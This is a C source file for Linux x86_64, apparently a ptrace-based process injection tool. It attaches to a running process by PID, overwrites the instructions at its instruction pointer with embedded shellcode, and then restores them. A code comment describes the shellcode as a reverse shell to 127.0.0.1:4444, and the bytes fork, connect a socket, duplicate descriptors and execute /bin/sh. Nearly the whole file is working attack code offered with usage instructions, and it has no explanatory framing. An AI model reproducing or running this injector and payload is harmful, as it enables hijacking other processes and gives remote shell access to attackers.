/*
usage: 
(Linux x86_64)
gcc ptrace_inject.c -o ptrace_inject
./inject_shellcode 1234
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/reg.h>
#include <sys/syscall.h>
#include <stdlib.h>
#include <sys/uio.h>

const int long_size = sizeof(long);

void getdata(pid_t child, long addr, char *str, int len)
{
    char *laddr;
    int i, j;
    union u
    {
        long val;
        char chars[long_size];
    } data;
    i = 0;
    j = len / long_size;
    laddr = str;
    while (i < j)
    {
        data.val = ptrace(PTRACE_PEEKDATA, child, addr + i * 8, NULL);
        memcpy(laddr, data.chars, long_size);
        ++i;
        laddr += long_size;
    }
    j = len % long_size;
    if (j != 0)
    {
        data.val = ptrace(PTRACE_PEEKDATA, child, addr + i * 8, NULL);
        memcpy(laddr, data.chars, j);
    }
    str[len] = '\0';
}

void putdata(pid_t child, long addr, char *str, int len)
{
    char *laddr;
    int i, j;

    union u {
        long val;
        char chars[long_size];
    }data;
    i = 0;
    j = len / long_size;
    laddr = str;
    while(i < j)
    {
        memcpy(data.chars, laddr, long_size);
        ptrace(PTRACE_POKEDATA, child, addr + i*8, data.val);
        i++;
        laddr += long_size;
    }
    j = len % long_size;
    if (j !=0)
    {
        memcpy(data.chars, laddr, j);
        ptrace(PTRACE_POKEDATA, child, addr + i*8, data.val);
    }
}

int main(int argc, char *argv[])
{
    pid_t pid;
    long orig_rax;
    struct user_regs_struct regs;
    int len = 185;
    // reverse shell to 127.0.0.1:4444
    char shellcode[] = "\x48\x31\xc0\x48\xc7\xc0\x3a\x00"
"\x00\x00\x0f\x05\x83\xf8\x00\x74"
"\x01\xcc\x48\x31\xc0\x48\xc7\xc0"
"\x29\x00\x00\x00\x48\xc7\xc7\x02"
"\x00\x00\x00\x48\xc7\xc6\x01\x00"
"\x00\x00\x48\xc7\xc2\x00\x00\x00"
"\x00\x0f\x05\x48\x89\xc7\x48\x31"
"\xc0\x48\xc7\xc0\x2a\x00\x00\x00"
"\x48\xb9\xfe\xff\xee\xa3\x80\xff"
"\xff\xfe\x48\xf7\xd9\x51\x54\x5e"
"\x48\xc7\xc2\x10\x00\x00\x00\x0f"
"\x05\x48\x31\xc0\x48\xc7\xc0\x21"
"\x00\x00\x00\x48\xc7\xc6\x00\x00"
"\x00\x00\x0f\x05\x48\x31\xc0\x48"
"\xc7\xc0\x21\x00\x00\x00\x48\xc7"
"\xc6\x01\x00\x00\x00\x0f\x05\x48"
"\x31\xc0\x48\xc7\xc0\x21\x00\x00"
"\x00\x48\xc7\xc6\x02\x00\x00\x00"
"\x0f\x05\x48\x31\xc0\x48\xc7\xc0"
"\x3b\x00\x00\x00\x48\xb9\x2f\x62"
"\x69\x6e\x2f\x73\x68\x00\x51\x54"
"\x5f\x48\xc7\xc6\x00\x00\x00\x00"
"\x48\xc7\xc2\x00\x00\x00\x00\x0f"
"\x05";
    char backup[len];

    if (argc != 2)
    {
        printf("usage: ./inject_shellcode <pid>\n");
        exit(1);
    }
    pid = atoi(argv[1]);

    printf("Attaching..\n");
    if (ptrace(PTRACE_ATTACH, pid, 0, 0) == -1)
    {
        perror("error attaching to process");
        exit(1);
    }
    waitpid(pid, NULL, 0);
    printf("Getting regs..\n");
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    printf("Getdata..\n");
    getdata(pid, regs.rip, backup, len);
    printf("Putdata..\n");
    putdata(pid, regs.rip, shellcode, len);
    printf("Setregs..\n");
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    
    /* if we attach to bash, it's likely it will
     be waiting on read syscall, let's change
     syscall number to 1 (write) so we cont for sure */
    printf("Cont..\n");
    ptrace(PTRACE_POKEUSER, pid, 8*ORIG_RAX, 1);        
    ptrace(PTRACE_CONT, pid, NULL, NULL);

    wait(NULL);

    printf("Shellcode injected, putting back original instructions\n");
    putdata(pid, regs.rip, backup, len);
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return 0;
}
